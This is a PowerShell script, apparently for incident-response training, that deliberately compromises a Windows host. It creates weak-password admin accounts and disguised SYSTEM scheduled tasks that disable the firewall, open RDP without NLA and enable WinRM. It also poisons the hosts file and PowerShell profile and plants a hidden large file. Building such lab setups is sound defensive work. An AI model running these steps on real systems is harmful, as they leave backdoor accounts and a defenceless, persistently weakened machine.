<#
.SYNOPSIS
    Training Infrastructure Setup Script (Windows Edition)
    INTENT: Creates IoCs, persistence, and misconfigurations for incident response training.
    WARNING: DO NOT RUN ON PRODUCTION SYSTEMS.
#>

# Check for Administrator privileges
if (-NOT ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
    Write-Warning "You do not have Administrator rights to run this script. Please re-run as Administrator."
    Break
}

Clear-Host
Write-Host "!!! WARNING !!!" -ForegroundColor Red
Write-Host "You are about to intentionally compromise this Windows machine for training."
Write-Host "Services will be stopped, security disabled, and registry keys modified."
$confirmation = Read-Host "Are you sure you want to proceed? (y/N)"
if ($confirmation -notmatch "^[Yy]$") {
    Write-Host "Aborting."
    Exit
}

# Directory for malicious artifacts
$ArtifactDir = "C:\Windows\Temp\SysMaint"
New-Item -ItemType Directory -Force -Path $ArtifactDir | Out-Null

# ==========================================
# 1. Random User Creation
# ==========================================
function Create-RandomUsers {
    Write-Host "[*] Creating random users..." -ForegroundColor Cyan
    
    $UserBase = @("Support", "HelpDesk", "WinRM_User", "IUSR_Backup", "SQL_Agent", "Veeam_Svc", "AzureAD_Sync")
    $Count = Get-Random -Minimum 3 -Maximum 8

    for ($i=0; $i -lt $Count; $i++) {
        $BaseName = $UserBase[(Get-Random -Maximum $UserBase.Count)]
        $UserName = "${BaseName}_$(Get-Random -Minimum 10 -Maximum 99)"
        $Password = ConvertTo-SecureString "Password123!" -AsPlainText -Force
        
        # Create User
        New-LocalUser -Name $UserName -Password $Password -Description "Service Account for internal tooling" -ErrorAction SilentlyContinue | Out-Null
        
        # Randomly assign to Administrators or leave as Standard
        if ((Get-Random) % 2 -eq 0) {
            Add-LocalGroupMember -Group "Administrators" -Member $UserName -ErrorAction SilentlyContinue
            $Role = "Admin"
        } else {
            $Role = "User"
        }
        
        Write-Host "    Created user: $UserName ($Role)"
    }
}

# ==========================================
# 2. Scheduled Task: Fake Credential Dump
# ==========================================
function Create-CredDumpTask {
    Write-Host "[*] Creating malicious credential dump task..." -ForegroundColor Cyan
    
    # Create the payload script
    $ScriptPath = "$ArtifactDir\audit_log_dump.ps1"
    $DumpFile = "C:\Windows\Temp\sam_hive_backup.txt"
    
    $Payload = @"
`$Output = "SIMULATED HASH DUMP :: " + (Get-Date).ToString()
`$Output | Out-File -FilePath "$DumpFile" -Append
# Attempt to act like we are touching LSASS
Get-Process lsass | Out-Null
"@
    Set-Content -Path $ScriptPath -Value $Payload

    # Register Task (Runs every X minutes)
    $Action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-ExecutionPolicy Bypass -File $ScriptPath"
    $Trigger = New-ScheduledTaskTrigger -Once -At (Get-Date) -RepetitionInterval (New-TimeSpan -Minutes (Get-Random -Minimum 2 -Maximum 10))
    Register-ScheduledTask -Action $Action -Trigger $Trigger -TaskName "Windows_Security_Audit_Routine" -User "SYSTEM" -Force | Out-Null
    
    Write-Host "    Task 'Windows_Security_Audit_Routine' created."
}

# ==========================================
# 3. Persistence: Disruptive Service (IIS/Firewall)
# ==========================================
function Create-DisruptiveTask {
    Write-Host "[*] Creating disruptive service task..." -ForegroundColor Cyan
    
    $ScriptPath = "$ArtifactDir\network_optimizer.ps1"
    
    # Script stops IIS (w3svc) and disables Firewall
    $Payload = @"
Write-Host "Optimizing Network..."
Stop-Service -Name w3svc -Force -ErrorAction SilentlyContinue
Stop-Service -Name W3SVC -Force -ErrorAction SilentlyContinue
Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False
"@
    Set-Content -Path $ScriptPath -Value $Payload

    # Register Task (Every 5 mins)
    $Action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-ExecutionPolicy Bypass -WindowStyle Hidden -File $ScriptPath"
    $Trigger = New-ScheduledTaskTrigger -Once -At (Get-Date) -RepetitionInterval (New-TimeSpan -Minutes 5)
    Register-ScheduledTask -Action $Action -Trigger $Trigger -TaskName "Network_Latency_Optimizer" -User "SYSTEM" -Force | Out-Null
    
    Write-Host "    Task 'Network_Latency_Optimizer' created (Disables Firewall/IIS)."
}

# ==========================================
# 4. Persistence: Insecure RDP/WinRM
# ==========================================
function Create-InsecureAccessTask {
    Write-Host "[*] Creating insecure remote access task..." -ForegroundColor Cyan
    
    $ScriptPath = "$ArtifactDir\remote_config.ps1"
    
    # Script enables RDP, removes NLA requirement, and enables WinRM
    $Payload = @"
# Enable RDP
Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -Name "fDenyTSConnections" -Value 0
# Disable NLA (Network Level Authentication) - Makes it very insecure
Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -Name "UserAuthentication" -Value 0
# Enable WinRM
Enable-PSRemoting -Force -SkipNetworkProfileCheck -ErrorAction SilentlyContinue
"@
    Set-Content -Path $ScriptPath -Value $Payload

    # Register Task (Every 7 mins)
    $Action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-ExecutionPolicy Bypass -WindowStyle Hidden -File $ScriptPath"
    $Trigger = New-ScheduledTaskTrigger -Once -At (Get-Date) -RepetitionInterval (New-TimeSpan -Minutes 7)
    Register-ScheduledTask -Action $Action -Trigger $Trigger -TaskName "Remote_Management_Helper" -User "SYSTEM" -Force | Out-Null

    Write-Host "    Task 'Remote_Management_Helper' created (Opens RDP/WinRM)."
}

# ==========================================
# 5. Annoying Functions
# ==========================================

function Annoy-HostsFile {
    Write-Host "[*] Annoyance: Poisoning Hosts file..." -ForegroundColor Yellow
    $HostsPath = "$env:SystemRoot\System32\drivers\etc\hosts"
    Add-Content -Path $HostsPath -Value "`r`n127.0.0.1 google.com" -ErrorAction SilentlyContinue
    Add-Content -Path $HostsPath -Value "`r`n127.0.0.1 www.google.com" -ErrorAction SilentlyContinue
}

function Annoy-PowerShellProfile {
    Write-Host "[*] Annoyance: Poisoning PowerShell Profile..." -ForegroundColor Yellow
    # This affects the current user and all users if run as admin
    $ProfilePath = $PROFILE.AllUsersAllHosts
    if (!(Test-Path $ProfilePath)) {
        New-Item -Type File -Path $ProfilePath -Force | Out-Null
    }
    # Alias 'ls' or 'dir' to sleep before running
    $Payload = 'function Get-ChildItem { Write-Host "Indexing file system..." -ForegroundColor Green; Start-Sleep -Seconds 3; Microsoft.PowerShell.Management\Get-ChildItem @args }'
    Add-Content -Path $ProfilePath -Value $Payload
}

function Annoy-FileExtensions {
    Write-Host "[*] Annoyance: Hiding File Extensions..." -ForegroundColor Yellow
    # Sets the registry key to HIDE extensions (default in Windows, but we enforce it if they turned it on)
    Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" -Name "HideFileExt" -Value 1 -ErrorAction SilentlyContinue
}

function Annoy-LegalNotice {
    Write-Host "[*] Annoyance: Setting Aggressive Login Banner..." -ForegroundColor Yellow
    $RegPath = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"
    Set-ItemProperty -Path $RegPath -Name "legalnoticecaption" -Value "SYSTEM COMPROMISED"
    Set-ItemProperty -Path $RegPath -Name "legalnoticetext" -Value "We are watching your every keystroke."
}

function Annoy-DiskSpace {
    Write-Host "[*] Annoyance: Creating hidden large file..." -ForegroundColor Yellow
    # Create a 500MB dummy file in a hidden programdata folder
    $DummyFile = "C:\ProgramData\Windows_Update_Cache.dat"
    $file = [System.IO.File]::Create($DummyFile)
    $file.SetLength(500MB)
    $file.Close()
    $file = Get-Item $DummyFile
    $file.Attributes = "Hidden"
}

# ==========================================
# Execution Flow
# ==========================================

Create-RandomUsers
Create-CredDumpTask
Create-DisruptiveTask
Create-InsecureAccessTask

# Pick 3 random annoyances
$Annoyances = @(
    { Annoy-HostsFile },
    { Annoy-PowerShellProfile },
    { Annoy-FileExtensions },
    { Annoy-LegalNotice },
    { Annoy-DiskSpace }
)

$Picks = $Annoyances | Get-Random -Count 3
foreach ($Pick in $Picks) {
    & $Pick
}

Write-Host "`nDONE. The system is now compromised and training-ready." -ForegroundColor Green
Write-Host "Good luck to your Blue Team!"